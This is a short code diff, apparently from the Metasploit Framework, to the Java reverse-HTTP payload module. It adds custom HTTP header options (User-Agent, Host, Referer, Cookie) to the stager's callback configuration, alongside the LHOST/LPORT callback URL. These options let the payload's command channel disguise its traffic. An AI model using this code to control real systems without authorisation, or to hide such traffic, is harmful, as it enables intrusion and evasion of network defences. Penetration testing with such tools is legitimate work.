@@ -23,10 +23,13 @@ module Payload::Java::ReverseHttp
   #
   def initialize(*args)
     super
-    register_advanced_options([
-      Msf::OptInt.new('Spawn', [true, 'Number of subprocesses to spawn', 2]),
-      Msf::OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)'])
-    ])
+    register_advanced_options(
+      [
+        OptInt.new('Spawn', [true, 'Number of subprocesses to spawn', 2]),
+        OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
+      ] +
+      Msf::Opt::http_header_options
+    )
   end
 
   #
@@ -64,6 +67,10 @@ module Payload::Java::ReverseHttp
 
     c =  ''
     c << "Spawn=#{ds["Spawn"] || 2}\n"
+    c << "HeaderUser-Agent=#{ds["HttpUserAgent"]}\n" if ds["HttpUserAgent"]
+    c << "HeaderHost=#{ds["HttpHostHeader"]}\n" if ds["HttpHostHeader"]
+    c << "HeaderReferer=#{ds["HttpReferer"]}\n" if ds["HttpReferer"]
+    c << "HeaderCookie=#{ds["HttpCookie"]}\n" if ds["HttpCookie"]
     c << "URL=#{scheme}://#{ds['LHOST']}"
     c << ":#{ds['LPORT']}" if ds['LPORT']
     c << luri
